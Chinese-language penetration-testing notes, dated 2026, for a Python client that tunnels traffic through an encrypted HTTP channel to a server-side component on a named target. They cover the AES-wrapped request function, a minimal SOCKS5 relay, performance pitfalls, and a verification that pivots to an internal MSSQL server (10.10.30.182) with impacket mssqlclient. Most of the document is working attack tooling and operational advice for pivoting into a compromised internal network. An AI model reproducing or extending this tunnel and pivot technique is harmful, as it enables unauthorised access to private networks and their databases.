# Python 隧道客户端架构要点（实测 2026-08, uscrec 案例）

完整可跑版本在 `D:\Pentest\渗透\usc_rec_菲律宾\tunnel\tunnel.py`（密钥/URL 已固化）。

## 核心函数

```python
def t_req(sess, params, data=b""):
    """一次隧道请求: body = [DLL + ~~~~~~ + k:v(base64),...] 整体 AES-CBC(IV=key,PKCS7) 加密
    响应 = 剥壳前缀 "Welcome You!<html>\n</html>\n{;}\n" 后取 "TUN:" 之后"""
    if data:
        params["d"] = base64.b64encode(data).decode()
    tail = ",".join(f"{k}:{base64.b64encode(v.encode()).decode()}" for k, v in params.items())
    r = sess.post(URL, data=enc_body(tail.encode()),
                  headers={"Content-Type": "application/octet-stream"}, timeout=60)
    raw = r.content
    if raw.startswith(PREFIX): raw = raw[len(PREFIX):]
    if raw.startswith(b"TUN:"): return b"OK", raw[4:]
    return b"ERR", raw[:100]
```

## 三个易错点（客户端侧）

1. **每条隧道连接用独立 `requests.Session()`**（独立 ASP.NET 会话 cookie）——同会话并发请求被 Session 锁串行化，吞吐崩
2. **send 动作返回的数据必须立即写回客户端**：push 线程 `resp = tc.send(d); if resp: client.sendall(resp)`。最初版本丢了这段 → SOCKS 下 HTTP 请求返回空
3. **pull 轮询间隔 30-80ms**，read 动作已非阻塞（服务器侧 Available==0 立即返回），轮询开销可控

## SOCKS5 服务端最小实现

```
握手: 收 \x05\xNMETHODS + 方法表 → 回 \x05\x00 (无认证)
请求: 收 VER CMD RSV ATYP DST.ADDR DST.PORT (ATYP 1=IPv4 4B / 3=域名 1B len + name / 4=IPv6 16B)
      CMD 只支持 1 (CONNECT) → 回 \x05\x00\x00\x01 + 0.0.0.0:0
中继: 双线程 (pull 轮询 read / push recv→send→写回), stop Event 控制
```

## 验证法

```python
import socks, socket
s = socks.socksocket(); s.set_proxy(socks.SOCKS5, "127.0.0.1", 1080); s.settimeout(15)
s.connect(("10.10.30.182", 1433))   # 内网目标
s.sendall(任意数据); s.recv(4096)
```

决定性验证（推荐）：forward 模式 + impacket mssqlclient 连本地端口：
```
./Scripts/mssqlclient.py "user:pass@127.0.0.1" -port 11433
→ 返回 "ERROR(SQL5063): Login failed for user 'xxx'" = 端到端通
（错误信息里的 SQL5xxx = 内网实例名；login failed = 服务器真实回应了）
```

## 反例（教训）
- 用 curl telnet 测 1433 连通性 → 假阴性（SQL 建连后不发言，curl 等 banner 超时）→ 误判"公网不通"。TCP 连通性一律 Python socket connect
- 裸 TDS prelogin 无响应 ≠ 隧道坏：SQL 强制 TLS（"Encryption required"），真客户端 TLS 会穿过透明隧道正常完成
